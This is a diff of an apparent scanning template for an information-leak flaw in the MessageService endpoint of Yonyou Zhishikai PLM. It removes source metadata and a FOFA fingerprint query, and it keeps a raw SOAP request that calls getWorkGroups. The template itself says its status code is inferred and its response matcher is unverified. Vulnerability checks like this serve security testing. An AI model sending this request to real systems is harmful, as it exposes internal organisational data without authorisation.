@@ -3,14 +3,8 @@ info:
   name: 用友智石开PLM MessageService存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/grbzfbgmwytv6o2m
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: grbzfbgmwytv6o2m
-    fofa: body="智石开PLM"
 http:
 - raw:
   - "POST /services/MessageService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nUpgrade-Insecure-Requests: 1\nPriority: u=1\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:mes=\"MessageService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <mes:getWorkGroups/>\n   </soapenv:Body>\n</soapenv:Envelope>"
